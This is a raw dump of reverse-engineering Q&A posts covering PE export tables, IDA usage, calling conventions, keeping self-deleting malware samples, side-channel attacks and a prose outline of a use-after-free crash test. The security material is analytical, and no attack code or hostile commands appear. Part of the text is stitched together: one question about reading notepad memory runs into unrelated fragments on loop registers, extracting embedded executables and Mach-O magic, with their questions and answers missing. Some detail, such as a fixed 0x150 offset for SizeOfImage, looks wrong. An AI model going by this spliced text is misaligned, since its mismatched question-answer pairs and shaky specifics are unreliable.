","<p>Ubicom32 is a proprietary architecture, not at all related to ARM or MIPS (other than the fact that it is RISC...well, kind of). IIRC it was designed specifically for networking and multimedia streaming applications, so it's a bit of an odd architecture. It was developed by Ubicom, but they were bought by Qualcomm.</p>

<p>There are Linux tool chains out there for it, the best place to get them that I've found is from vendor GPL releases. If there is no GPL release for your particular device, look for other Ubicom-based devices from that vendor (or other vendors) which do have GPL releases.</p>

<p>Beware that just having a toolchain probably won't be sufficient for reversing the code, you'll need an assembly reference to understand the instructions as well. AFAIK Ubicom never released this publicly, but some creative Googling turned up some mostly complete references for me a while back. I'll see if I can track down the links.</p>

"Name and Ordinal table pointers in export directory are NULL although DLL exports functions","960","","<p>I'm trying to explore the functions exported by profapi.dll and I came across a behavior that I can't explain. </p>

<p>Reading about the PE binary format I gather that the export table has 3 tables (arrays): one array containing function pointers of exported functions, another containing names (strings) of exported functions, and a third array containing the integer ordinal numbers of the exported functions. The linker needs the information in the name and/or the ordinal table to patch calls to exported functions in other DLLs. The name table pointer can be NULL if the DLL exports its functions using only ordinal numbers. </p>

<p>However, for profapi.dll, I see that both the name table and the ordinal table pointers are NULL; yet the DLL exports 6 functions (verified using IDAPro). In fact, shell32.dll calls one of the functions in profapi.dll using its ordinal number and the linker somehow resolves the address. I'm not sure how the linker is able to resolve the call in shell32.dll. Moreover, pefile, the Python library I am using to parse the DLL reports that profapi.dll does not export any functions since both the name and ordinal table pointers are NULL. What am I missing?</p>

<p>I'm using profapi.dll version 6.1.7600.16385 and shell32.dll version 6.1.7601.2278 on Windows 7. I'm using pefile version 1.2.10-139.</p>
","<p>The ""ordinal table"" (also known as the Export Ordinal Table or <code>AddressOfNameOrdinals</code>) is used in conjunction with the ""name table"" (also known as the Export Name Pointer Table or <code>AddressOfNames</code>) if-and-only-if functions are exported by name.</p>

<p>From the <a href=""http://msdn.microsoft.com/en-us/windows/hardware/gg463119.aspx"" rel=""nofollow noreferrer"">official PE-COFF documentation</a>:</p>

<blockquote>
  <p>The export name pointer table and the export ordinal table form two
  parallel arrays that are separated to allow natural field alignment.
  These two tables, in effect, operate as one table, in which the Export
  Name Pointer column points to a public (exported) name and the Export
  Ordinal column gives the corresponding ordinal for that public name. A
  member of the export name pointer table and a member of the export
  ordinal table are associated by having the same position (index) in
  their respective arrays.</p>
</blockquote>

<p>But if there are no functions exported by name, then there is no Export Name Pointer Table, and if there's no Export Name Pointer Table then there's on need for the Export Ordinal Table either, which is why both fields are <code>NULL</code> in the Export Directory Table.</p>

<blockquote>
  <p>In fact, shell32.dll calls one of the functions in profapi.dll using
  its ordinal number and the linker somehow resolves the address.</p>
</blockquote>

<p>The build-time linker (part of the compiler toolkit) doesn't resolve the address; the run-time loader (part of Windows) resolves the address. The loader see that shell32.dll imports a profapi.dll function by a given ordinal number (let's say <code>105</code>, for example), so it subtracts profapi.dll's Ordinal Base (let's say <code>101</code>, for example) from the ordinal number and uses the result (<code>4</code> in this example) as an index into the Export Address Table to find the RVA of the imported function. Neither the Export Ordinal Table nor the Export Name Pointer Table are needed.</p>

<blockquote>
  <p>Moreover, pefile, the Python library I am using to parse the DLL
  reports that profapi.dll does not export any functions since both the
  name and ordinal table pointers are NULL. What am I missing?</p>

<p><a href=""https://reverseengineering.stackexchange.com/a/6635/1562"">As discussed here</a>, the pefile Python library is broken, or at least older versions of it are known to be broken with respect to ordinal handling.</p>

"Creating a struct in IDA which contains a cString?","957","","<p>Normally I struct is a fixed size. Is it possible to define a structure which contains an element which has different sizes?</p>

<p>To illustrate what I mean is this.</p>

<p>The layout of the data in the file looks like this:</p>

<pre><code>ID          WORD 0
FunctionPtr DWORD OFFSET Fkt
Name        db 'Name of the function',0
align 4
</code></pre>

<p>'Name' is now a C-String which is as long until it reaches the 0-byte at the end and then follows the align instruction. So is it possible to tell IDA that the structure is including the string, no matter how long it is?</p>
","<p>Unless the string is at the <em>end</em> of the structure, it doesn't make sense to try and make this struct in IDA, because it probably doesn't even exist in C (or whatever the original language was).</p>

<p>Now if the string <em>is</em> at the end of the struct, this might correlate to an actual C struct definition. This is called a <a href=""http://gcc.gnu.org/onlinedocs/gcc/Zero-Length.html"" rel=""nofollow"">""zero-length"" array, or ""flexible array member""</a>. Of course, the size of this array is zero, as far as <code>sizeof</code> is concerned. </p>

<p>Unfortunately, this still doesn't exist in IDA. What I've done in the past (again, where the string is <em>last</em>) is go ahead and create a one-byte field, so you at least know where the string starts.  This will complicate things if you try to use <code>size mystruct</code> for any constants in the code, but at least your string offset will be correct.</p>

"What does arg_0 = dword ptr 4 mean?","957","","<p>I try to use IDA dissembler and I don't really understand the following text paragraphs appearing at the head of functions:</p>

<pre><code>arg_0 = dword ptr 4
</code></pre>

<p>Can anyone explain their meaning?</p>
","<p>That's not a command, and not really part of the assembly language.
IDA uses those markers to ease the reading of assembly instructions relating to the stack.</p>

<p>Once IDA detects an offset would point into the function's stack as either an internal variable or an argument, it'll assign a name to the specific stack offsets each parameter and/or argument points to from the base of the stack.</p>

<p>It then calculates all offsets to the same position regardless of stack growth/shrinking and will use the stack offset names where-ever they're possible.</p>

<p>The syntax is the following:</p>

<pre><code>&lt;argument/variable name&gt; = &lt;size&gt; ptr &lt;offset from stack base&gt;
</code></pre>

<p>So in your example, IDA identified the first argument to the function and named it <code>arg_0</code> (you can change the name by pressing <kbd>n</kbd> when your cursor is on it). The argument is a dword and the function's base stack offset is 4.</p>

<p>Because the offset is positive IDA identified the stack address as an argument. Negative offsets will be recognized as variables and will have the <code>var_</code> prefix instead.</p>

"How do I find where a String is referenced in IDA Pro?","953","","<p>Please bear in mind I am very new to all this - however I have searched and could not easily find an answer to my issue.</p>

<p>I have an elf (actually an Android aboot image based upon LK) that I loaded into IDA Pro. I see Strings, and I wish to find out where these strings are referenced in code.</p>

<p><a href=""https://i.stack.imgur.com/KaVEa.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/KaVEa.png"" alt=""enter image description here""></a></p>

<p>I have tried to find cross-references to these strings in the code but there aren't any.</p>

<p>Am I totally naive and missed out something totally obvious to the initiated? Could the strings be referenced by some obtuse run-time calculation of address (to obfuscate references) rather than just straightforward absolute/relative reference (which IDA mostly could work out?)</p>

<p>Many thanks.</p>
","<p>It could just be an array of strings that is referenced by a table of offsets into the array.  Here is an example of how strerror() looks up strings:</p>

<p><a href=""https://i.stack.imgur.com/NWYBN.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/NWYBN.png"" alt=""String table example""></a></p>

<p>Should be pretty straightforward to see that <em>errid</em> is just used to calculate the pointer for a corresponding string in the <em>errmsg</em> table by the <strong>strerror()</strong> function.  This could be why you are not seeing xrefs for those strings.  Without more information, that's my best guess.  I would try to find the beginning of that list of strings and look for an xref there.</p>

"Determining if a variable is local or an argument passed to a function","951","","<p>How can you determine if a variable is a local variable of the function or an argument passed to the function?</p>
","<h1>Parameters</h1>

<p>Not only does it depend on the platform but different functions have different calling conventions. The calling convention basically tells you how you know where the arguments are. It says nothing about the local function stack frame layout. </p>

<p>It's also extremely important to understand that when a function or method can be proven by the compiler or linker to not be accessed by code outside of what the compiler can see in the current translation unit or the linker in the current binary they are free to do whatever they want. This includes passing arguments in manners which do not correspond the the <a href=""http://en.wikipedia.org/wiki/Application_binary_interface"">ABI</a>. This is an even larger problem with the rising popularity of link time code generation.</p>

<p>The ABI is basically the interface which all binaries on platform promises to adhere to so that there can be a guarantee that binaries written in different languages can interact. However if your binary does not export a function it does not usually need to adhere to the ABI.</p>

<h1>Variables</h1>

<p>Variables can really only be stored in three locations</p>

<ol>
<li><p>they can be stored on the stack in the local stack frame of the current function. This can be seen when the access is done relative to the stack pointer and where the offset is within the function stack frame and antedates the saved local registers. This usually means that the variable antedate the return address for calling conventions without link registers. Accesses where the offset precedes the return address is generally arguments. Calling conventions with link registers don't store return addresses on the stack unless they have to so variables antedate the saved registers portion of the <a href=""http://en.wikipedia.org/wiki/Stack_frame#Structure"">stack frame</a> and stack based arguments precede the saved registers portion of the stack frame. </p></li>
<li><p>global storage, generally in either the heap or in a segment of the executable binary mapped by the loader.</p></li>
<li><p>registers, this is generally used for variables which are used very frequently in the function since the register banks is the fastest storage available to the CPU. Variables can also be kept in registers for the duration of the function if the compiler determines that the CPU has enough registers to store all variables in the register bank. The optimization of which registers store what and when is called <a href=""http://en.wikipedia.org/wiki/Register_allocation"">register allocation</a>. It's also important to realize that variables that go out of scope or are unused later on in a function frees up registers. This means that one register can map to different variables at different stages of a function.</p></li>
</ol>

<h1>Calling conventions</h1>

<h2>IA32 calling conventions</h2>

<p>In rough order of likelihood to run into.</p>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"">cdecl</a></h3>

<blockquote>
  <p>In cdecl, subroutine arguments are passed on the stack. Integer values and memory addresses are returned in the EAX register, floating point values—in the ST0 x87 register. Registers EAX, ECX, and EDX are caller-saved, and the rest are callee-saved. The x87 floating point registers ST0 to ST7 must be empty (popped or freed) when calling a new function, and ST1 to ST7 must be empty on exiting a function.</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#thiscall"">thiscall</a></h3>

<blockquote>
  <p>On the Microsoft Visual C++ compiler, the this pointer is passed in ECX and it is the callee that cleans the stack, mirroring the stdcall convention used in C for this compiler and in Windows API functions. When functions use a variable number of arguments, it is the caller that cleans the stack.</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#stdcall"">stdcall</a></h3>

<blockquote>
  <p>Callee is responsible for cleaning up the stack, but the parameters are pushed onto the stack in right-to-left order, as in the _cdecl calling convention. Registers EAX, ECX, and EDX are designated for use within the function. Return values are stored in the EAX registe</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#fastcall"">fastcall</a></h3>

<blockquote>
  <p>Passes the first two arguments (evaluated left to right) that fit into ECX and EDX. Remaining arguments are pushed onto the stack from right to left.</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#pascal"">pascal</a></h3>

<blockquote>
  <p>Parameters are pushed on the stack in left-to-right order (opposite of cdecl), and the callee is responsible for balancing the stack before return.</p>
</blockquote>

<h2>AMD64 calling conventions</h2>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#Microsoft_x64_calling_convention"">Microsoft</a></h3>

<blockquote>
  <p>The Microsoft x64 calling convention[9] (for long mode on x86-64) uses registers RCX, RDX, R8, R9 are used for the first four integer or pointer arguments (in that order left to right), and XMM0, XMM1, XMM2, XMM3 are used for floating point arguments. Additional arguments are pushed onto the stack (right to left). Integer return values (similar to x86) are returned in RAX if 64 bits or less. Floating point return values are returned in XMM0. Parameters less than 64 bits long are not zero extended; the high bits contain garbage.</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI"">Pretty much everyone else</a></h3>

<blockquote>
  <p>Followed on Solaris, GNU/Linux, FreeBSD, and other non-Microsoft operating systems. The first six integer or pointer arguments are passed in registers RDI, RSI, RDX, RCX, R8, and R9, while XMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6 and XMM7 are used for floating point arguments. For system calls, R10 is used instead of RCX.[11] As in the Microsoft x64 calling convention, additional arguments are passed on the stack and the return value is stored in RAX.</p>
</blockquote>

<h2><a href=""http://en.wikipedia.org/wiki/Calling_convention#ARM"">ARM calling conventions</a></h2>

<blockquote>
  <p>r14 is the link register, r12 is the Intra-Procedure-call scratch register, r0 to r3 are used to hold argument values passed to a subroutine, and also hold results returned from a subroutine. </p>
</blockquote>

<p>More than 4 arguments and they get pushed on the stack.</p>

<h2><a href=""http://www.ibm.com/developerworks/library/l-ppc/"">PowerPC calling conventions</a></h2>

<blockquote>
  <p>Since the PowerPC has so many GPRs (32 compared to ia32's 8), arguments are passed in registers starting with gpr3. Registers gpr3 through gpr12 are volatile (caller-save) registers that (if necessary) must be saved before calling a subroutine and restored after returning. Variable argument count functions store the argument on the stack for the callee.</p>
</blockquote>

<h2><a href=""http://en.wikipedia.org/wiki/Calling_convention#MIPS"">MIPS calling conventions</a></h2>

<h3><a href=""http://en.wikipedia.org/wiki/Calling_convention#MIPS"">O32</a></h3>

<blockquote>
  <p>the first four arguments to a function in the registers $a0-$a3; subsequent arguments are passed on the stack. Space on the stack is reserved for $a0-$a3 in case the callee needs to save its arguments, but the registers are not stored there by the caller. The return value is stored in register $v0; a second return value may be stored in $v1.</p>
</blockquote>

<h3><a href=""http://en.wikipedia.org/wiki/Calling_convention#MIPS"">N32 and N64</a></h3>

<blockquote>
  <p>pass the first eight arguments to a function in the registers $a0-$a7; subsequent arguments are passed on the stack. The return value (or a pointer to it) is stored in the registers $v0; a second return value may be stored in $v1. In both the N32 and N64 ABIs all registers are considered to be 64-bits wide.</p>

"Prevent malware from deleting itself during installation on Windows x64","948","","<p>Can anyone suggest a tool to prevent a malware from deleting itself on Windows x64? The purpose is to collect all the components of the whole process of infection.</p>

<p>I've looked at CaptureBat, but its drivers are only 32-bit.
I also thought about using file recovery utilities for this.</p>
","<p>There are couple of ways that I could think of.</p>

<p><strong>First off</strong>, you could use <a href=""http://www.cuckoosandbox.org"" rel=""nofollow""><strong>Cuckoo Sandbox</strong></a>. It is an automated malware analysis system. It is open source and its modules are written in <a href=""http://python.org"" rel=""nofollow""><strong>Python</strong></a>. To quote the website: </p>

<blockquote>
  <p>Malware! Tear it apart, discover its ins and outs and collect actionable threat data. Cuckoo is the leading open source automated malware analysis system.</p>
</blockquote>

<p>Pretty exciting, isn't it? I believe, it will capture dropped files by default. Once a malware sample is submitted to <strong><a href=""http://www.cuckoosandbox.org"" rel=""nofollow"">Cuckoo Sandbox</a></strong> and analysis is completed, user gets analysis report. Certain sub-directory of the analysis report will contain files <strong>Cuckoo</strong> was able to dump. For more information check out <strong><a href=""https://cuckoo.readthedocs.org/en/latest/usage/results/index.html?highlight=dropped"" rel=""nofollow"">Cuckoo's Analysis Result</a></strong> page. </p>

<p>In addition, you could create your own custom module to process dropped files. What are <strong>processing modules</strong>? Per <a href=""https://cuckoo.readthedocs.org/en/latest/customization/processing/index.html"" rel=""nofollow""><strong>Cuckoo Doc Website</strong></a>:  </p>

<blockquote>
  <p>Cuckoo’s processing modules are Python scripts that let you define custom ways to analyze the raw results generated by the sandbox and append some information to a global container that will be later used by the signatures and the reporting modules. You can create as many modules as you want, as long as they follow a predefined structure...</p>
</blockquote>

<p>I am pretty sure there are other automated sandboxes out there as well. However, you have to remember, there is no 100% guarantee a sandbox will process your malware just the way it would execute in real life environment. </p>

<p><strong>Second method</strong>. You really need to know <strong>HOW</strong> dropped files are deleted for this method to work. I have already mentioned it in the comments above. You could also patch your executable. Let's say <strong><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa363915%28v=vs.85%29.aspx"" rel=""nofollow"">DeleteFile()</a></strong> is used. If patching malware is not an option, you could hook <strong><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa363915%28v=vs.85%29.aspx"" rel=""nofollow"">DeleteFile()</a></strong> function system wide. It is standard Windows API used to delete a file. This function is exported by <strong>Kernel32.dll</strong>. There is a lot written about system wide or global hooks and ways to accomplish it. I will not go in details about it here. However, there is one thing worth mentioning, you have to make sure you ""trick"" malware into ""thinking"" file is indeed delete by returning appropriate values. That's why, there could be a problem with using ACL directly. What if malware checks a return of <strong>DeleteFile()</strong> (or whatever it uses to delete the dropped file), and gets <strong>ERROR_ACCESS_DENIED</strong>? It might very well divert it from the regular ""desired"" execution path. </p>

<p>In addition, there are debuggers out there, that you help you make this process rather semi-automated.

"What is SCARE (Side-Channel Attacks Reverse-Engineering)?","947","","<p>When reversing smart-cards, the <a href=""http://en.wikipedia.org/wiki/Side_channel_attack"" rel=""nofollow"">side-channel attacks</a> are known to be quite effective on hardware. But, what is it, and can it be used in software reverse-engineering and how?</p>
","<p>A '<em>side-channel attack</em>' define any technique that will consider unintended and/or indirect information channels to reach his goal. It has been first defined in smart-card cryptography to describe attacks which are using unintentional information leak from the embedded chip on the card and that can be used in retrieval of keys and data. For example, it may be used by monitoring:</p>

<ul>
<li><p><strong>Execution Time</strong> (Timing attack): To distinguish which operations has been performed and guess, for example, which branch of the code has been selected (and, thus, the value of the test).</p></li>
<li><p><strong>Power Consumption</strong> (Power monitoring attack): To distinguish precisely what sequence of instructions has been performed and be able to recompose the values of the variables. Note that there exist several techniques of analysis using the same input but with slightly different way of analyzing it. For example, we can list: <em>Single Power Analysis</em> (SPA), <em>Differential Power Analysis</em> (DPA), <em>High-order Differential Power Analysis</em> (HO-DPA), <em>Template Attacks</em>, ...</p></li>
<li><p><strong>Electromagnetic Radiation</strong> (Electromagnetic attacks): Closely related to power consumption, but can also provide information that are not found in power consumption especially on RFID or NFC chips.</p></li>
</ul>

<p>If you're more interested in learning how to leverage this information then I'd suggest to start by reading <a href=""http://rads.stackoverflow.com/amzn/click/1441940391"" rel=""nofollow"">Power Analysis Attacks</a>. Don't get 'scared' away by the fact that the book is about smart cards. Most of the information also applies 1-to-1 on 'normal' (SoC) embedded devices.</p>

<p>Forgot to mention there's an open source platform called <a href=""http://sourceforge.net/projects/opensca/"" rel=""nofollow"">OpenSCA</a> and some open source hardware called FOBOS (Flexible Open-source BOard for Side-channel) for which I can't seem to find a proper link from home.</p>

<h2>Application to Software Reverse-engineering</h2>

<p>Speaking about the application of side-channel attacks in software reverse engineering now, it is more or less any attacks that will rely on using unintended or indirect information leakage. The best recent example is this <a href=""http://shell-storm.org/blog/A-binary-analysis-count-me-if-you-can/"" rel=""nofollow"">post</a> from <a href=""https://twitter.com/JonathanSalwan"" rel=""nofollow"">Jonathan Salwan</a> describing how he guessed the password of a crackme just by counting the number of instructions executed on various inputs with <a href=""http://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool"" rel=""nofollow"">Pin</a>.</p>

<p>More broadly, this technique has been used since long in software reverse-engineering without naming it, or could have improved many analysis. The basic idea is to first consider that if a piece of software is too obscure to understand it quickly, we can consider it as a black-box and think about using a side-channels technique to guess the enclosed data through a guided trial and error technique.</p>

<p>The list of side-channels available in software reverse-engineering is much longer than the one we have in hardware. Because it enclose the previous list and add some new channels such as (non exhaustive list):</p>

<ul>
<li><p><strong>Instruction Count</strong>: Allow to identify different behaviors depending on the input.</p></li>
<li><p><strong>Read/Write Count</strong>: Same as above, with more possibilities to identify patterns because it includes also instruction read.</p></li>
<li><p><strong>Raised Interrupt Count</strong>: Depending on what type of interrupt is raised, when and how, you might identify different behaviors and be able to determined the good path to your goal.</p></li>
<li><p><strong>Accessed Instruction Addresses</strong>: Allow to rebuild the parts of the program that are active at a precise moment.</p></li>
<li><p><strong>Accessed Memory Addresses</strong>: Allow to rebuild data pattern or complex data-structure stored or accessed in memory (eg. in the heap).</p></li>
</ul>

<p>This list is far from being exhaustive, but basically tools such as Valgrind VM or others can be used to perform such analysis and quickly deduce information about the behavior of a given program, thus speeding up the reverse-engineering.</p>

<h2>Obfuscation and Possible Counter-measures</h2>

<p>Trying to build a software which will be resistant to such attacks will borrow also a lot from the smart-card industry. But, not only. Here are a few tricks, I could think of (but far from being complete about all we can find).</p>

<h3>Armoring Program Branches</h3>

<p>The instruction count is extremely efficient to detect which branch has been taken in code like this:</p>

<pre><code>if (value)
   ret = foo();
else 
   ret = bar();
</code></pre>

<p>With <code>foo()</code> and <code>bar()</code> having different instruction count.</p>

<p>This can be defeated by executing <code>foo()</code> and <code>bar()</code> whatever <code>value</code> is and deciding afterward what is the value of <code>ret</code>.</p>

<pre><code>tmp_foo = foo();
tmp_bar = bar();
if (value)
  ret = tmp_foo;
else
  ret = tmp_bar;
</code></pre>

<p>This technique render your program much more difficult to guess from a side-channel attack, but also much less efficient. One has to find a proper trade-off.</p>

<h3>Countering Timing Attacks</h3>

<p>Timing attacks are extremely easy to perform and difficult to workaround because <code>sleep()</code> cannot be an option (too easy to detect in a code and, anyway you cannot assume a specific speed for the processor). The programmer has to identify the execution time of each branch of his program and to <em>balance</em> each branch with extra non-useful operations which are of the same computational power than the ones from the other branchs. The point being to render each branch indistinguishable from the others only based on the execution time. </p>

<h3>Threading Madness</h3>

<p>Another way to dilute the side-channel is to massively multi-thread your program. Imagine that each branch of your program is executed in a separate thread, and one variable tell in which thread the current program really is (if possible in a cryptic manner). Then side-channel analysis will be much more difficult to perform.</p>

<h2>Conclusion and Further Research</h2>

<p>Side-channel attacks has been widely under-estimated for software reverse-engineering, it can drastically speed-up the reverse of many programs. But, in the same time, obfuscation techniques exists and have to be developed specifically targeting software reverse-engineering. So, don't be surprised if you see more and more novelties related to this field.</p>

"Tools to get started with reading memory during runtime","944","","<p>I want to get into reverse engineering and eventually be able to read the memory of a specific game during runtime and work with this data. For this purpose I have been doing research on that topic and was considering to start with a simple task to learn about the proper tools and stuff like finding offsets for various information.</p>

<p>I wanted to open an instance of the notepad editor, write some text into it and then access this text from another program after figuring out the right addresses. Although it seems as if OllyDbg is a famous choice I had problems to attach it to my notepad process. (Apparently some problem with the 64-bit Windows 10 would be my first guess here.)</p>

<p>Anyways, I was curious if you can suggest me tools and alternatives for OllyDbg to get into this, especially proving the possibility to search the memory contents with specific patterns, in my sample case the text I entered on screen.</p>

<ul>
<li>first goes three times as <strong>3</strong> was moved into <strong>%ecx</strong> at 0x4010a4  </li>
<li>second loop will go two times as 2 was moved into <strong>%ecx</strong> at 0x40109d and saved at %esi before %ecx was used further inside the first loop.</li>

<blockquote>
  <p>0x4010ba      lea    0xffffffd8(%ebp),%eax</p>

<p>This mean that %eax got the address from calculating  %ebp+0xffffffd8  </p>

<blockquote>
  <p>0x4010bd      lea    (%ebx,%edx,4),%ebx</p>

<p>is it possible to extract an executable inside another executable an d how?</p>
","<p>It is possible. Where is the embedded executable located? Based on my experience there are a couple of locations:</p>

<ul>
<li><strong>Overlay</strong>: If it is in overlay, just select it entirely from the ""MZ"" signature to the end and dump it. Try to open it in the debugger then to see if it is working. More about this can be found <a href=""https://reverseengineering.stackexchange.com/questions/2014/how-can-one-extract-the-appended-data-of-a-portable-executable"">here</a></li>
<li><strong>Resource</strong>: If the embedded file is part of the resource, just dump the appropriate resource using some tool like <a href=""https://www.aldeid.com/wiki/LordPE"" rel=""nofollow noreferrer"">LordPE</a></li>
<li><strong>Section</strong>: This is the most trickiest case if you are new to this. Locate the first byte of the embedded PE file (the ""MZ"" signature bytes). From there position at offset 0x150. There you have a 4 byte value which contains the <em>SizeOfImage</em>. The <em>SizeOfImage</em> field tells you how much memory space the PE file takes when loaded in memory. When you get that value, you can select that many bytes and dump them. This way you are sure that the entire embedded file will be dumped.</li>
</ul>

<p>NOTE: If the original file has overlay, it would be a good idea to copy that overlay to the embedded file once you extract it because it is possible that the dumped file will make use of the overlay data.</p>

<p>What is supposed to happen here? Why is the presence of <code>FEEDFACE</code> expected at the address <code>8FFF0000</code> or <code>8FFF1000</code>? I understand that <code>feedface</code>/<code>feedfacf</code> are Mach-O magic numbers -- however why are they expected to be present at those addresses?</p>
","<p>It's the Mach-O header magic. From <code>mach-o/loader.h</code>:</p>

<pre><code>/* Constant for the magic field of the mach_header (32-bit architectures) */
#define MH_MAGIC        0xfeedface      /* the mach magic number */
#define MH_CIGAM        0xcefaedfe      /* NXSwapInt(MH_MAGIC) */
</code></pre>

<p>In OS X, the Mach-O header is often included as part of the <code>__TEXT</code> segment so it's mapped into memory. The code is searching for a Mach-O file mapped somewhere in that address range - probably some system library - possibly so it can search for a necessary function to call (enumerate Mach-O load commands to locate the symbol table, etc.).</p>

<p>Please share your views. Thanks.</p>
","<p>The first thing that comes to my mind is for you to create a class with a few virtual methods, which will be used as the test subject. Then from your ActiveX control you'd expose methods that manipulate the variable, say:</p>

<ul>
<li>Method #1: Allocate the test object and keep the pointer in a static variable</li>
<li>Method #2: Call the virtual methods provided by the test object</li>
<li>Method #3: Free the test object instance, <strong>without setting the pointer to NULL</strong></li>
<li>Some means to allocate other things that would reuse the memory freed in the previous method</li>
</ul>

<p>Then whip up a basic script exercising the given methods: allocate, call the methods to make sure it works as designed, free the instance, allocate something else, call virtual methods again and crash the IE instance. ;-) Should do the trick.</p>

"Modifying a binary save-data file for a video game with a CRC/Checksum check","930","","<p>I recently overwrote the save game file of a video game that my girlfriend and I had been playing through. After trying to recover the file a few different ways (game didn't erase but overwrote the save file), I'm resigned to trying to rebuild the save data manually.</p>

<p>I've played with reverse engineering binary executables from crackmes.de in the past with Ollydbg, but this is different and I feel like I'm a bit out of my waters.</p>

<p>The game (Sonic All Stars Racing) uses a single .bin file to store records for four in-game accounts. Using a hex editor, pen and paper, I've begun to plot out the file structure and locate offsets for various records.</p>

<p>The problem I have is that whenever I make a modification to the file, same size or otherwise, the game declares the save file corrupted and fails to use it. I assume that this is because the game is implementing some form of CRC/checksum on the data to prevent using a corrupted file. (Aside: are CRC and checksum interchangeable terms?)</p>

<hr>

<p>The game saves the data to a file named <code>""ssr_save.bin""</code> which is responsible for four in-game profiles.</p>

<p>What I did was create four different save files by making a backup of the save file after  creating each profile.</p>

<p>Each file is largely the same. 727040 bytes large. The only difference seems to be the first 12 bytes (0x00 to 0x0B inclusive). These first twelve bytes are completely unique between the four files.</p>

<p>There does, however, appear to be more than one data object in that range as there are 3 bytes of zero in the centre of the 12.</p>

<pre><code>File 1: 19 8E 0B 60 13 00 00 00 F9 3E 00 B0
File 2: 93 7B 0F 36 13 00 00 00 B6 35 02 9B
File 3: 69 71 1B 14 13 00 00 00 A1 30 08 8A
File 4: D9 47 32 E8 13 00 00 00 D9 9B 13 74
</code></pre>

<p>What I'm trying to figure out is what these bytes represent and how I can manipulate them to let me modify the body of the save data and not throw the corruption error in the game.</p>

<p>Can anyone help me find out how the game is checksumming the file and reverse engineer the process so I can create a valid file?</p>

<p><a href=""https://dl.dropboxusercontent.com/u/303145/savefiles.zip"" rel=""nofollow"">Here is an archive of the four save-data files</a></p>

<p>Troy.</p>
","<p>This is quite hard question to answer due to variables within reverse engineering.</p>

<p>I would recommend you start off with:</p>

<ul>
<li>Start game</li>
<li>Get some coins or whatever is saved then save the game.</li>
<li>Restart the game and get more coins and save the game.</li>
<li>Replace the new save with your old file.</li>
<li>Does it load? See Answer 1. Otherwise, Answer 2.</li>
</ul>

<p><strong>Answer 1</strong>
Your modified versions of your game files are just in the incorrect format.
You will need to some reverse engineering of how the bytes are used within the game.
I'd recommend you breakpoint CreateFile and ReadFile and step through your debugger and see how each byte is been read. Ofcourse, this can become a massive task.</p>

<p><strong>Answer 2</strong>
The game file checksum could be stored somewhere on the file-system or registry to ensure data-integrity of the file. You could use tools such as Process Monitor to help you locate this file or you could set breakpoint on CreateFile and ReadFile and search for it yourself manually.

"Put encrypted code blocks back as unencrypted in IDA","930","","<p>So I have some encrypted data in this executable. IDA couldn't do much with it, so it defined it as arrays.

<img src=""https://i.stack.imgur.com/eMa0z.gif"" alt=""enter image description here"">
As we can see the information of two views is almost duplicated.</p>
","<p>This was interesting when DOS was the operating system of choice, processors had 16 bits, and programs were larger than 64 KB. Those times, the content of segment registers changed a lot; programs had to use far jumps (that changed CS and IP) to jump to addresses more than 64 KB away, and they had to load a value into DS or ES first to access large data segments (or load <code>0x0040</code> into ES to access BIOS data structures and have access to the 'high resolution timer' which changed 18.2 times a second).</p>

<p>Here's part of the disassembly of an old 16 bit program:</p>

<p><img src=""https://i.stack.imgur.com/Nc3PN.png"" alt=""enter image description here""></p>

<p>Please note that there are three segment changes that change the assumption of IDA about the contents of the segments, and another one at <code>25EB</code> where <code>ES</code> is 'changed' to <code>seg130</code>, which isn't really a change, so there's no <code>assume</code> directive.</p>

<p>Here's the corresponding segment registers view:</p>

<p><img src=""https://i.stack.imgur.com/bh5wy.png"" alt=""enter image description here""></p>

<p>in which <code>15412</code> corresponds to <code>seg001:25B2</code>; if you click on that row in IDA, the program view will jump to that address. The following 3 'change points' correspond to the next addresses where the code actually changes a segment register value.</p>

<p>Those days, programs contained several code segments, and several data segments, so the program segmentation view had a lot to show as well:</p>

<p><img src=""https://i.stack.imgur.com/opPEb.png"" alt=""enter image description here""></p>

<p>you see there are many <code>CODE</code> segments and many <code>UNK</code>nown segments, only a small part of the whole program is shown. Each of these <code>CODE</code> segments used a different value for <code>CS</code>, which is why IDA creates a new segment register change entry for each new segment.</p>

<p>These days, unless you're disassembling kernel code, you won't see segment register changes at all, and even if you're disassembling the kernel, you'll have one code segment and one data segment, not many of them. So IDA just creates one segment from each section of the input file, and creates the corresponding change points, but there's no change point except the ones that are created for the segments. Which is why the views correspond to each other, and which is also why you're not interested in either of them in most cases.</p>

"Origin of ""Hacker Protection Factor""","927","","<p><a href=""http://www.saikoa.com/dexguard"" rel=""nofollow"">Dexguard</a> claims a ""hacker protection factor"" of 35 without any explanation of where the number comes from or what it means. I figure the actual statement is meaningless, but I'm very curious to see who is assessing these protection factors. </p>

<p>A Google search didn't turn up anything, so I thought that the Dexguard authors probably made it up themselves. But <a href=""https://twitter.com/nflnfl/status/241442557580673024"" rel=""nofollow"">this Twitter post</a> implies that there are other ""hacker protection factors"", out there which 35 can be compared with. </p>

<p>Does anyone know what the deal with this is? Is it just more pointless puffery? Is there an actual group that is assigning these numbers?</p>
","<p>""Hacker Protection Factor"" is a geeky play of words on ""Sun Protection Factor"" -- how much longer can an application be attacked before being damaged. The numbers are based on empirical evidence (""<em>Based on our experience,...</em>""). I thought it was cute; it is not an industry standard, but it does serve as a simple indication that an application processed with ProGuard is more difficult to reverse-engineer than the original application, and an application processed with DexGuard is <em>a lot</em> more difficult to reverse-engineer.</p>

","<p>The LZMA compression identified by binwalk is correct (or at least most of them are - I didn't check them all).

